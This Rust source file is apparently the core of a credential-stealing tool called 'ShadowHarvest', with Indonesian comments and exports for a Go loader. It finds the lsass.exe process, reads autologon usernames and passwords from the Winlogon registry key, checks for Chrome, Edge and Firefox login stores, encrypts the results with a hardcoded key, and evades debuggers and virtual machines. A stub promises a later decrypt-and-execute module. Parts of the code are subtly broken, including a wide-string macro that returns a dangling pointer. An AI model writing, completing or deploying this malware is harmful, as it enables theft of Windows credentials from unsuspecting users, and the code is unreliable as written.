// ============================================================================
// SHADOWHARVEST ENGINE - RUST STEALTH ENGINE
// ============================================================================

use libc::{c_int, c_void, free, malloc};
use std::ptr;
use std::slice;
use std::sync::atomic::{AtomicBool, Ordering};

// ============================================================================
// WINAPI - ALL IMPORTS (LENGKAP!)
// ============================================================================
#[cfg(target_os = "windows")]
use winapi::shared::minwindef::*;
#[cfg(target_os = "windows")]
use winapi::um::winreg::*;
#[cfg(target_os = "windows")]
use winapi::um::winnt::*;           // ← INI UNTUK KEY_READ!
#[cfg(target_os = "windows")]
use winapi::um::tlhelp32::*;
#[cfg(target_os = "windows")]
use winapi::um::handleapi::*;
#[cfg(target_os = "windows")]
use winapi::um::processthreadsapi::*;
#[cfg(target_os = "windows")]
use winapi::um::debugapi::*;

use aes_gcm::{
    aead::{Aead, KeyInit},
    Aes256Gcm, Nonce,
};
use base64::{engine::general_purpose::STANDARD as BASE64, Engine};
use serde_json::json;

// ============================================================================
// TYPE DEFINITIONS
// ============================================================================

#[repr(C)]
pub struct RawData {
    pub data: *const u8,
    pub len: c_int,
    pub is_freed: *mut AtomicBool,
}

const ENCRYPTION_KEY: [u8; 32] = [
    0x12, 0x34, 0x56, 0x78, 0x9A, 0xBC, 0xDE, 0xF0,
    0x11, 0x22, 0x33, 0x44, 0x55, 0x66, 0x77, 0x88,
    0x99, 0xAA, 0xBB, 0xCC, 0xDD, 0xEE, 0xFF, 0x00,
    0x11, 0x22, 0x33, 0x44, 0x55, 0x66, 0x77, 0x88,
];

// ============================================================================
// 1. ENCRYPT PAYLOAD
// ============================================================================

#[no_mangle]
pub extern "C" fn encrypt_payload(
    plaintext: *const u8,
    len: c_int,
    key: *const u8,
    key_len: c_int,
) -> RawData {
    if plaintext.is_null() || len <= 0 || key.is_null() || key_len != 32 {
        return RawData { data: ptr::null(), len: 0, is_freed: ptr::null_mut() };
    }

    let plaintext_slice = unsafe { slice::from_raw_parts(plaintext, len as usize) };
    let key_slice = unsafe { slice::from_raw_parts(key, key_len as usize) };

    let cipher = match Aes256Gcm::new_from_slice(key_slice) {
        Ok(c) => c,
        Err(_) => return RawData { data: ptr::null(), len: 0, is_freed: ptr::null_mut() },
    };

    let nonce_bytes: [u8; 12] = rand::random();
    let nonce = Nonce::from_slice(&nonce_bytes);

    let ciphertext = match cipher.encrypt(nonce, plaintext_slice) {
        Ok(c) => c,
        Err(_) => return RawData { data: ptr::null(), len: 0, is_freed: ptr::null_mut() },
    };

    let mut encrypted = nonce_bytes.to_vec();
    encrypted.extend_from_slice(&ciphertext);

    let encrypted_base64 = BASE64.encode(&encrypted);
    let output_bytes = encrypted_base64.into_bytes();

    let is_freed = Box::into_raw(Box::new(AtomicBool::new(false)));
    let output_ptr = unsafe { malloc(output_bytes.len()) as *mut u8 };

    if output_ptr.is_null() {
        return RawData { data: ptr::null(), len: 0, is_freed: ptr::null_mut() };
    }

    unsafe {
        ptr::copy_nonoverlapping(output_bytes.as_ptr(), output_ptr, output_bytes.len());
    }

    RawData { data: output_ptr, len: output_bytes.len() as c_int, is_freed: is_freed }
}

// ============================================================================
// 2. FREE RAW DATA
// ============================================================================

#[no_mangle]
pub extern "C" fn free_raw_data(data: RawData) {
    if data.data.is_null() || data.is_freed.is_null() {
        return;
    }

    let is_freed = unsafe { &*data.is_freed };
    if is_freed.load(Ordering::SeqCst) {
        return;
    }
    is_freed.store(true, Ordering::SeqCst);

    if !data.data.is_null() {
        unsafe { free(data.data as *mut c_void); }
    }

    unsafe { let _ = Box::from_raw(data.is_freed); }
}

// ============================================================================
// 3. GET RAW DATA LENGTH
// ============================================================================

#[no_mangle]
pub extern "C" fn get_raw_data_len(data: RawData) -> c_int {
    if data.data.is_null() || data.is_freed.is_null() {
        return 0;
    }

    let is_freed = unsafe { &*data.is_freed };
    if is_freed.load(Ordering::SeqCst) {
        return 0;
    }
    data.len
}

// ============================================================================
// 4. FIND LSASS
// ============================================================================

#[no_mangle]
pub extern "C" fn find_lsass_stealth() -> u32 {
    #[cfg(target_os = "windows")]
    {
        unsafe {
            let snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
            if snapshot == INVALID_HANDLE_VALUE {
                return 0;
            }

            let mut entry: PROCESSENTRY32W = std::mem::zeroed();
            entry.dwSize = std::mem::size_of::<PROCESSENTRY32W>() as u32;

            if Process32FirstW(snapshot, &mut entry) == 0 {
                CloseHandle(snapshot);
                return 0;
            }

            loop {
                let name = String::from_utf16_lossy(&entry.szExeFile);
                if name.to_lowercase() == "lsass.exe" {
                    CloseHandle(snapshot);
                    return entry.th32ProcessID;
                }

                if Process32NextW(snapshot, &mut entry) == 0 {
                    break;
                }
            }

            CloseHandle(snapshot);
            0
        }
    }

    #[cfg(not(target_os = "windows"))]
    {
        0
    }
}

// ============================================================================
// 5. COLLECT WINLOGON
// ============================================================================

#[no_mangle]
pub extern "C" fn collect_winlogon_stealth() -> RawData {
    #[cfg(target_os = "windows")]
    {
        let mut credentials = String::new();

        unsafe {
            let mut h_key: HKEY = ptr::null_mut();
            let status = RegOpenKeyExW(
                HKEY_LOCAL_MACHINE,
                w!("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon"),
                0,
                KEY_READ,
                &mut h_key,
            );

            if status == 0 {
                let keys = ["DefaultUserName", "DefaultPassword", "DefaultDomainName", "AutoAdminLogon"];

                for &key_name in &keys {
                    let mut buf: [u16; 256] = [0; 256];
                    let mut buf_len = 256;
                    let mut data_type = 0;

                    let status = RegQueryValueExW(
                        h_key,
                        w!(key_name),
                        ptr::null_mut(),
                        &mut data_type,
                        buf.as_mut_ptr() as *mut u8,
                        &mut buf_len,
                    );

                    if status == 0 && buf_len > 0 {
                        let len = (buf_len / 2) as usize;
                        let slice = &buf[..len];
                        let mut text = String::new();
                        for &ch in slice {
                            if ch != 0 {
                                if let Some(c) = char::from_u32(ch as u32) {
                                    text.push(c);
                                }
                            }
                        }
                        credentials.push_str(&format!("{}={}\n", key_name, text));
                    }
                }

                RegCloseKey(h_key);
            }
        }

        encrypt_payload(
            credentials.as_ptr(),
            credentials.len() as c_int,
            ENCRYPTION_KEY.as_ptr(),
            32,
        )
    }

    #[cfg(not(target_os = "windows"))]
    {
        let dummy = "windows_only".as_bytes();
        encrypt_payload(dummy.as_ptr(), dummy.len() as c_int, ENCRYPTION_KEY.as_ptr(), 32)
    }
}

// ============================================================================
// 6. COLLECT BROWSER
// ============================================================================

#[no_mangle]
pub extern "C" fn collect_browser_stealth() -> RawData {
    let mut credentials = String::new();

    #[cfg(target_os = "windows")]
    {
        use std::env;
        let local_appdata = env::var("LOCALAPPDATA").unwrap_or_default();
        let appdata = env::var("APPDATA").unwrap_or_default();

        let chrome_path = format!("{}\\Google\\Chrome\\User Data\\Default\\Login Data", local_appdata);
        if std::path::Path::new(&chrome_path).exists() {
            credentials.push_str("Chrome: FOUND\n");
        }

        let edge_path = format!("{}\\Microsoft\\Edge\\User Data\\Default\\Login Data", local_appdata);
        if std::path::Path::new(&edge_path).exists() {
            credentials.push_str("Edge: FOUND\n");
        }

        let firefox_path = format!("{}\\Mozilla\\Firefox\\Profiles", appdata);
        if std::path::Path::new(&firefox_path).exists() {
            credentials.push_str("Firefox: FOUND\n");
        }
    }

    encrypt_payload(
        credentials.as_ptr(),
        credentials.len() as c_int,
        ENCRYPTION_KEY.as_ptr(),
        32,
    )
}

// ============================================================================
// 7. ANTI-DEBUG
// ============================================================================

#[no_mangle]
pub extern "C" fn is_debugged() -> c_int {
    #[cfg(target_os = "windows")]
    {
        if unsafe { IsDebuggerPresent() } != 0 {
            return 1;
        }
    }
    0
}

// ============================================================================
// 8. ANTI-VM
// ============================================================================

#[no_mangle]
pub extern "C" fn is_vm() -> c_int {
    #[cfg(target_arch = "x86_64")]
    {
        use std::arch::x86_64::__cpuid;
        let result = __cpuid(1);
        if (result.ecx & (1 << 31)) != 0 {
            return 1;
        }
    }
    0
}

// ============================================================================
// EXECUTE MODULE - FFI untuk Go
// ============================================================================

#[no_mangle]
pub extern "C" fn execute_module(
    encrypted_data: *const u8,
    len: c_int,
) -> RawData {
    let result = std::panic::catch_unwind(|| {
        if encrypted_data.is_null() || len <= 0 {
            return RawData {
                data: ptr::null(),
                len: 0,
                is_freed: ptr::null_mut(),
            };
        }

        let encrypted_slice = unsafe { slice::from_raw_parts(encrypted_data, len as usize) };

        // 🔥 Sementara return data dummy untuk testing
        // Nanti diisi implementasi decrypt + execute
        let dummy_result = format!("Executed module with {} bytes", encrypted_slice.len());
        let result_bytes = dummy_result.into_bytes();

        let is_freed = Box::into_raw(Box::new(AtomicBool::new(false)));
        let output_ptr = unsafe { malloc(result_bytes.len()) as *mut u8 };

        if output_ptr.is_null() {
            return RawData {
                data: ptr::null(),
                len: 0,
                is_freed: ptr::null_mut(),
            };
        }

        unsafe {
            ptr::copy_nonoverlapping(result_bytes.as_ptr(), output_ptr, result_bytes.len());
        }

        RawData {
            data: output_ptr,
            len: result_bytes.len() as c_int,
            is_freed: is_freed,
        }
    });

    match result {
        Ok(data) => data,
        Err(_) => RawData {
            data: ptr::null(),
            len: 0,
            is_freed: ptr::null_mut(),
        },
    }
}

// ============================================================================
// 9. MACRO WIDE STRING
// ============================================================================

#[macro_export]
macro_rules! w {
    ($s:expr) => {{
        let mut wide: Vec<u16> = $s.encode_utf16().collect();
        wide.push(0);
        wide.as_ptr()
    }};
}